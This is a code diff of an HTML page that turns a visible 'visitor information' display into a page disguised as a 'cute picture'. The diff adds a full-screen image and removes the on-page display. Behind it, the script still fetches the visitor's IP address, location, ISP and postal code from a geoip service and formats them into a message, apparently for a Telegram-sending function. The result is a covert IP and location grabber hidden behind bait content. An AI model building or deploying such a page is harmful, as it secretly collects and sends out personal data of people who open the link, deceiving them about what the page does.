@@ -3,22 +3,11 @@
 	<head>
 		<meta charset="UTF-8">
 		<meta name="viewport" content="width=device-width, initial-scale=1.0">
-		<title>访问者信息</title>
+		<title>可爱图片</title>
 	</head>
+	<img src="https://ymy.gay/https://cdn.jsdelivr.net/gh/png-dot/pngpng@main/20231005-220130-nmt89k.jpeg" alt="描述图片的文本"
+		style="width: 100%; height: 100%;">
 	<body>
-		<div id="visitorInfo">
-			<h2>访问者信息</h2>
-			<p>IP地址: <span id="ipAddress"></span></p>
-			<p>地理位置: <span id="location"></span></p>
-			<p>ISP: <span id="isp"></span></p>
-			<p>城市: <span id="city"></span></p>
-			<p>地区: <span id="region"></span></p>
-			<p>邮政编码: <span id="zip"></span></p>
-			<p>国家: <span id="country"></span></p>
-			<p>浏览器: <span id="browser"></span></p>
-			<p>操作系统: <span id="os"></span></p>
-		</div>
-
 		<script>
 			async function sendTelegramMessage(message) {
 				try {
@@ -55,33 +44,17 @@
 
 			async function fetchVisitorInfo() {
 				try {
-					const response = await fetch('http://ip-api.com/json', {
-						referrerPolicy: 'no-referrer'
-					});
+					const response = await fetch('https://api.ip.sb/geoip');
 					const data = await response.json();
-
-					document.getElementById('ipAddress').textContent = data.query;
-					document.getElementById('location').textContent = `${data.city}, ${data.regionName}, ${data.country}`;
-					document.getElementById('isp').textContent = data.isp;
-					document.getElementById('city').textContent = data.city;
-					document.getElementById('region').textContent = data.regionName;
-					document.getElementById('zip').textContent = data.zip;
-					document.getElementById('country').textContent = data.country;
-					document.getElementById('browser').textContent = navigator.userAgent;
-					document.getElementById('os').textContent = navigator.platform;
 
 					// 构建访问者信息消息
 					const visitorInfoMessage = `
-                    访问者信息:
-                    IP地址: ${data.query}
-                    地理位置: ${data.city}, ${data.regionName}, ${data.country}
-                    ISP: ${data.isp}
-                    城市: ${data.city}
-                    地区: ${data.regionName}
-                    邮政编码: ${data.zip}
-                    国家: ${data.country}
-                    浏览器: ${navigator.userAgent}
-                    操作系统: ${navigator.platform}
+访问者信息:
+IP地址: ${data.ip}
+地理位置: ${data.city}, ${data.region}, ${data.country}
+ISP: ${data.isp}
+邮政编码: ${data.postal_code}
+国家代码: ${data.country_code}
                 `;
 
 					// 输出访问者信息到控制台
